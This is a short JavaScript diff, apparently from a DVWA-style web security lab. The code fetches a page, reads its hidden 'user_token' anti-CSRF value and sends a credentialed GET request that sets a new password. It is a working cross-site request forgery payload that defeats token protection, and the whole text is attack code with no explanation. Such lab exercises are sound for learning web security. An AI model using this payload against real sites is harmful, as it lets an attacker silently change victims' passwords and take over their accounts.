@@ -9,15 +9,10 @@ fetch(theUrl, {
 }).then(function(text) {
     var parser = new DOMParser();
     var doc = parser.parseFromString(text, "text/html");
-    console.log(doc);
     var token = doc.getElementsByName('user_token')[0].value;
     console.log(token);
-    var form = new FormData();
-    form.append('user_token', token);
-    form.append('password_new', pass);
-    form.append('password_conf', pass);
-    form.append('Change', 'Change');
-    fetch(theUrl, {
+    new_url = theUrl + '?password_new=' + pass + '&password_conf=' + pass + '&Change=Change&user_token=' + token + '&Change=Change';
+    fetch(new_url, {
         method: 'GET',
         credentials: 'include'
     }).then(function(response) {
